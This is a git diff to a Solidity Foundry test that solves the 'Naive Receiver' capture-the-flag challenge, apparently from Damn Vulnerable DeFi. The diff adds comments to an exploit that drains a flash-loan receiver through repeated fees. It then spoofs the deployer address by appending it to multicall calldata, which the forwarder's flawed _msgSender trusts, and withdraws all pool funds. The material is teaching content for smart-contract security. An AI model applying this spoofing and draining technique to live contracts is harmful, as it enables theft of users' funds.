@@ -77,18 +77,24 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        //Use multicall to create sequenced calls to forwarder using Request data format
         bytes[] memory hackCallDatas = new bytes[](11);
+        // @dev - we need to generate 10 flashloan calls to extract 10 ETH of fees (1 ETH for each flashloan) in order to drain the pool (balance: 10 ETH)
         for (uint256 i = 0; i < 10; i++) {
             hackCallDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
         }
+        // @dev - the pool is using a homemade _msgSender() function that returns the address of the forwarder unless we
+        // send a call with a msg.data size over 20bytes. In this case, the _msgSender response will be the given parsed content of
+        // msg.data (after 20 bytes). Here, we pack the address of the deployer address in order to be able to retrieve the funds, because
+        // the security check done by the _msgSender function will be flawed and consider our call as coming from the pool deployer.
         hackCallDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
             bytes32(uint256(uint160(deployer)))
         );
 
+        // @dev - we encode the call of the pool multicall function with all the data we created
         bytes memory callData;
         callData = abi.encodeCall(pool.multicall, (hackCallDatas));
 
+        // @dev - we create a valid request object in order to be able to call the forwarder
         BasicForwarder.Request memory req = BasicForwarder.Request(
             player,
             address(pool),
@@ -99,6 +105,7 @@ contract NaiveReceiverChallenge is Test {
             1 days
         );
 
+        // @dev - we calculate the request hash
         bytes32 requestHash = keccak256(
             abi.encodePacked(
                 "\x19\x01",
@@ -107,9 +114,11 @@ contract NaiveReceiverChallenge is Test {
             )
         );
 
+        // @dev - we sign the request hash with the player private key
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
         bytes memory sig = abi.encodePacked(r, s, v);
 
+        // @dev - we execute the request containing our flawed multicall
         require(forwarder.execute(req, sig));
     }
 
